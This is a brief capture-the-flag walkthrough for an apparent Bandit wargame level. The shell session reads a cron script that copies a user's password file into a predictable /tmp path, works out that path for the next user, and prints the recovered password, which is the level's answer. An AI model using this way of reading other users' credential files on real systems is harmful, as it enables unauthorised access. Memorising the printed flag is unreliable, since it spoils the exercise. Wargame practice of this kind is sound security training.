@@ -1,0 +1,41 @@
+"A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed."
+
+///////////////////////////
+
+bandit22@bandit:/$ ls -la /etc/cron.d
+total 28
+drwxr-xr-x   2 root root 4096 Dec 28  2017 .
+drwxr-xr-x 100 root root 4096 Jul 22 18:47 ..
+-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
+-rw-r--r--   1 root root  120 Dec 28  2017 cronjob_bandit22
+-rw-r--r--   1 root root  122 Dec 28  2017 cronjob_bandit23
+-rw-r--r--   1 root root  120 Dec 28  2017 cronjob_bandit24
+-rw-r--r--   1 root root  190 Oct 31  2017 popularity-contest
+bandit22@bandit:/$ cat /etc/cron.d/cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+bandit22@bandit:/$ mkdir /tmp/23
+bandit22@bandit:/$ cp /usr/bin/cronjob_bandit23.sh /tmp/23
+bandit22@bandit:/$ cd /tmp/23
+bandit22@bandit:/tmp/23$ cat cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+bandit22@bandit:/tmp/23$ nano cronjob_bandit23.sh
+Unable to create directory /home/bandit22/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+bandit22@bandit:/tmp/23$ ./cronjob_bandit23.sh
+Copying passwordfile /etc/bandit_pass/bandit23 to /tmp/8ca319486bfbbc3663ea0fbe81326349
+./cronjob_bandit23.sh: line 8: /tmp/8ca319486bfbbc3663ea0fbe81326349: Permission denied
+bandit22@bandit:/tmp/23$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+# When editing cronjob_bandit23.sh, change myname=$whoami to myname=bandit23 and save, then run. 
